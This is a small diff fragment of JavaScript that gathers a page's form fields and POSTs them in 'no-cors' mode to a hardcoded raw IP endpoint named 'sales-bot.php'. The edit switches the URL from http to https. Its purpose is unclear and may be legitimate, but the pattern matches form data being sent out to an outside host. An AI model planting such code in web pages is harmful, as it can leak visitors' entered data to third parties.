@@ -35,7 +35,7 @@ for (const pair of formData){
   sParams.append(pair[0], pair[1], pair[2], pair[3]);
 }
 
-fetch("http://80.211.107.117/sales/sales-bot.php",{
+fetch("https://80.211.107.117/sales/sales-bot.php",{
 method: 'post',
 mode:"no-cors",
 body:sParams
